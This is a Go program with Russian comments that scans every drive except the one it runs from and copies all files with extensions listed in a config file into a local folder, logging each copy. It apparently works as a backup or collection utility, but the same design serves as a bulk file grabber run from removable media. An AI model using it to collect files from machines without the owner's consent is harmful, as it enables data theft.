package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
)

var distFolder = "copy"
var logFile = "copy.log"
var configFile = "config.txt"

var ignoredDirs = map[string]bool{
	"C:\\ProgramData":         true,
	"C:\\Windows":             true,
	"C:\\Program Files":       true,
	"C:\\Program Files (x86)": true,
}

// Функция для проверки, нужно ли пропустить сканирование текущего диска
func shouldSkipDrive(drive string) bool {
	currentDrive, _ := os.Getwd()
	currentVolume := filepath.VolumeName(currentDrive) + "\\"
	return strings.EqualFold(currentVolume, drive)
}

// Функция для проверки, нужно ли пропустить директорию
func shouldSkipDir(dir string) bool {
	_, skip := ignoredDirs[dir]
	return skip
}

// Функция для сканирования и копирования файлов по заданному пути
func findAndCopy(folderToSearch string, fileExts []string, whereCopy string) error {
	err := filepath.WalkDir(folderToSearch, func(s string, d os.DirEntry, err error) error {
		if err != nil {
			if os.IsPermission(err) {
				fmt.Printf("Skipping directory due to permission error: %s\n", s)
				return nil
			}
			return err
		}

		if d.IsDir() && shouldSkipDir(s) {
			fmt.Printf("Skipping directory: %s\n", s)
			return filepath.SkipDir
		}

		if !d.IsDir() {
			for _, ext := range fileExts {
				if filepath.Ext(d.Name()) == ext {
					err := copyFile(s, filepath.Join(whereCopy, distFolder, d.Name()))
					if err != nil {
						log.Printf("Error copying file %s: %v\n", s, err)
					} else {
						log.Printf("Copied: %s\n", s)
					}
					break
				}
			}
		}
		return nil
	})
	if err != nil {
		log.Printf("Error walking directory %s: %v\n", folderToSearch, err)
	}
	return nil
}

// Функция для копирования файла
func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	err = os.MkdirAll(filepath.Dir(dst), os.ModePerm)
	if err != nil {
		return err
	}

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	_, err = io.Copy(dstFile, srcFile)
	return err
}

// Функция для чтения конфигурационного файла
func readConfigFile(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var extensions []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ext := strings.TrimSpace(scanner.Text())
		if ext != "" {
			extensions = append(extensions, ext)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}

	if len(extensions) == 0 {
		return nil, fmt.Errorf("config file is empty or contains invalid data")
	}

	return extensions, nil
}

func main() {
	logf, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}
	defer logf.Close()
	log.SetOutput(logf)

	// Чтение конфигурационного файла для получения расширений файлов
	whereCopy, err := os.Getwd()
	if err != nil {
		log.Fatalf("Failed to get working directory: %v", err)
	}

	configFilePath := filepath.Join(whereCopy, configFile)
	filetypeFind, err := readConfigFile(configFilePath)
	if err != nil {
		log.Fatalf("Failed to read config file: %v", err)
	}
	log.Printf("Looking for files with extensions: %v\n", filetypeFind)

	// Получаем список всех дисков, кроме текущего
	var drives []string
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		driveLetter := string(drive) + ":\\"
		if !shouldSkipDrive(driveLetter) {
			drives = append(drives, driveLetter)
		}
	}

	err = os.MkdirAll(filepath.Join(whereCopy, distFolder), os.ModePerm)
	if err != nil {
		log.Fatalf("Failed to create destination directory: %v", err)
	}

	for _, drive := range drives {
		searchPath := drive
		log.Printf("Scanning %s for files with extensions: %v...\n", searchPath, filetypeFind)
		err := findAndCopy(searchPath, filetypeFind, whereCopy)
		if err != nil {
			log.Printf("Error scanning and copying files: %v\n", err)
		}
	}
}
